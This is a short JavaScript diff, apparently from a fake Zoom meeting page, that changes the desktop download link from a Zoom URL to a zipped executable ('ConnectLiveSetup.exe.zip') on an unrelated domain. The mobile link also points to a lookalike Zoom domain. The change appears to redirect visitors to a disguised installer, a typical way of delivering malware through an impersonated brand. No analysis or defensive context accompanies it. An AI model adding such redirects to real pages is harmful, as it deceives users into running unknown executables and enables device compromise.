@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", () => {
      */
 
     const DESKTOP_DESTINATION =
-        "https://zoom.com/download/application";
+        "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";
 
     const MOBILE_DESTINATION =
         "https://meeting.zoomlite.live/";
